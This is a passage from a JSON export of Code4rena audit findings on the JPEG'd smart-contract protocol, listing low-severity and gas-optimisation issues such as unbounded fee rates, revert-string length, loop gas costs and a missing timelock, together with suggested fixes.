class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">organizationFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">//@audit low: fee can be 100% (rate.denominator == rate.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">\"invalid_rate\"</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">404</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">405</span><span class=\"mtk1\">:     }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded",
      "tags": [],
      "finders": []
    },
    {
      "id": "5309",
      "title": "[L-05] Fee in",
      "impact": "LOW",
      "content": "<h2 id=\"l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" aria-label=\"l 05 fee in strategypusdconvexsetperformancefee should be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Fee in <code>StrategyPUSDConvex.setPerformanceFee()</code> should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPerformanceFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">\"INVALID_RATE\"</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100% (_performanceFee.denominator == _performanceFee.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:     }</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded",
      "tags": [],
      "finders": []
    },
    {
      "id": "4444",
      "title": "[G-43] Use Custom Errors instead of Revert Strings to save Gas",
      "impact": "GAS",
      "content": "\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nSee [original submission](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121) for instances.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1098310851):**\n > Very high quality report, may implement some of your suggestions. Thank you!\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1105050319):**\n > Implemented most of your suggestions in [jpegd/core#21](https://github.com/jpegd/core/pull/21). Custom errors have not been implemented as it would be too big of a change at this point and doing it properly may cause unexpected behaviour/bugs due to the codebase changing too much.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-43-use-custom-errors-instead-of-revert-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4443",
      "title": "[G-42] Reduce the size of error messages (Long revert Strings)",
      "impact": "GAS",
      "content": "\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\ntokens/JPEG.sol:23:            \"JPEG: must have minter role to mint\"\ntokens/StableCoin.sol:41:            \"StableCoin: must have minter role to mint\"\ntokens/StableCoin.sol:55:            \"StableCoin: must have pauser role to pause\"\ntokens/StableCoin.sol:69:            \"StableCoin: must have pauser role to unpause\"\nvaults/NFTVault.sol:394:            \"credit_rate_exceeds_or_equals_liquidation_rate\" \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or using custom errors as described next.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-42-reduce-the-size-of-error-messages-long-revert-strings",
      "tags": [],
      "finders": []
    },
    {
      "id": "4442",
      "title": "[G-41] Public functions to external",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n```solidity\nwithdraw(IERC20,uint256) should be declared external:\n - Controller.withdraw(IERC20,uint256) (contracts/vaults/yVault/Controller.sol#151-154)\nsetFarmingPool(address) should be declared external:\n - YVault.setFarmingPool(address) (contracts/vaults/yVault/yVault.sol#115-118)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-41-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "4441",
      "title": "[G-40] Consider making some constants as non-public to save gas",
      "impact": "GAS",
      "content": "\nReducing from `public` to `private` or `internal` can save gas when a constant isn't used outside of its contract.\nI suggest changing the visibility from `public` to `internal` or `private` here:\n\n```solidity\ntokens/JPEG.sol:10:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:22:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:23:    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:66:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/yVault/Controller.sol:15:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/FungibleAssetVaultForDAO.sol:41:    bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\");\nvaults/NFTVault.sol:71:    bytes32 public constant DAO_ROLE = keccak256(\"DAO_ROLE\");\nvaults/NFTVault.sol:72:    bytes32 public constant LIQUIDATOR_ROLE = keccak256(\"LIQUIDATOR_ROLE\");\nvaults/NFTVault.sol:74:    bytes32 public constant CUSTOM_NFT_HASH = keccak256(\"CUSTOM\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-40-consider-making-some-constants-as-non-public-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4440",
      "title": "[G-39] Use `calldata` instead of `memory`",
      "impact": "GAS",
      "content": "\nWhen arguments are read-only on external functions, the data location should be `calldata`:\n\n```solidity\ncontracts/vaults/NFTVault.sol:\n  212:     function setDebtInterestApr(Rate memory _debtInterestApr) //@audit gas: should be calldata\n  222:     function setValueIncreaseLockRate(Rate memory _valueIncreaseLockRate)  //@audit gas: should be calldata\n  232:     function setCreditLimitRate(Rate memory _creditLimitRate)  //@audit gas: should be calldata\n  247:     function setLiquidationLimitRate(Rate memory _liquidationLimitRate)  //@audit gas: should be calldata\n  290:     function setOrganizationFeeRate(Rate memory _organizationFeeRate)  //@audit gas: should be calldata\n  300:     function setInsurancePurchaseRate(Rate memory _insurancePurchaseRate)  //@audit gas: should be calldata\n  311:         Rate memory _insuranceLiquidationPenaltyRate  //@audit gas: should be calldata\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-39-use-calldata-instead-of-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "4439",
      "title": "[G-38] Increments can be unchecked",
      "impact": "GAS",
      "content": "\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThe code would go from:\n\n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:\n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-38-increments-can-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4437",
      "title": "[G-36] An array's length should be cached to save gas in for-loops",
      "impact": "GAS",
      "content": "\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-36-an-arrays-length-should-be-cached-to-save-gas-in-for-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "4434",
      "title": "[G-33] No need to explicitly initialize variables with default values",
      "impact": "GAS",
      "content": "\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/FungibleAssetVaultForDAO.sol:45:    address internal constant ETH = address(0);\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest removing explicit initializations for default values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-33-no-need-to-explicitly-initialize-variables-with-default-values",
      "tags": [],
      "finders": []
    },
    {
      "id": "4433",
      "title": "[G-32] Upgrade pragma to at least 0.8.4",
      "impact": "GAS",
      "content": "\nAcross the whole solution, the declared pragma is `^0.8.0`.\n\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n*   **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n*   **Optimizer improvements in packed structs** (>= 0.8.3)\n*   **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4:\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-32-upgrade-pragma-to-at-least-084",
      "tags": [],
      "finders": []
    },
    {
      "id": "4401",
      "title": "[L-07] A magical number should be documented and explained:",
      "impact": "LOW",
      "content": "<h2 id=\"l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" style=\"position:relative;\"><a href=\"#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" aria-label=\"l 07 a magical number should be documented and explained 1e36 use a constant instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] A magical number should be documented and explained: <code>1e36</code>. Use a constant instead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">196</span><span class=\"mtk1\">:                </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">207</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">307</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">94</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">172</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">newAccRewardsPerShare</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">totalStaked</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">179</span><span class=\"mtk1\">:            (</span><span class=\"mtk12\">accRewardPerShare</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">userLastAccRewardPerShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">account</span><span class=\"mtk1\">])) / </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>I suggest using <code>constant</code> variables as this would make the code more maintainable and readable while costing nothing gas-wise.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4398",
      "title": "[L-04] Add a timelock and event to critical functions",
      "impact": "LOW",
      "content": "<h2 id=\"l-04-add-a-timelock-and-event-to-critical-functions\" style=\"position:relative;\"><a href=\"#l-04-add-a-timelock-and-event-to-critical-functions\" aria-label=\"l 04 add a timelock and event to critical functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Add a timelock and event to critical functions</h2>\n<p>It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.</p>\n<p>Consider adding a timelock and event to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/yVault/strategies/StrategyPUSDConvex.sol:177:    function setPerformanceFee(Rate memory _performanceFee)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/NFTVault.sol:290:    function setOrganizationFeeRate(Rate memory _organizationFeeRate)</span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-04-add-a-timelock-and-event-to-critical-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "4397",
      "title": "[L-03] Unbounded loop on array can lead to DoS",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-unbounded-loop-on-array-can-lead-to-dos\" style=\"position:relative;\"><a href=\"#l-03-unbounded-loop-on-array-can-lead-to-dos\" aria-label=\"l 03 unbounded loop on array can lead to dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Unbounded loop on array can lead to DoS</h2>\n<p>As this array can grow quite large, the transaction’s gas cost could exceed the block gas limit and make it impossible to call this function at all (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allocPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">( </span><span class=\"mtk3\">//@audit low: a push exist but there's no pop in the solution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAll</span><span 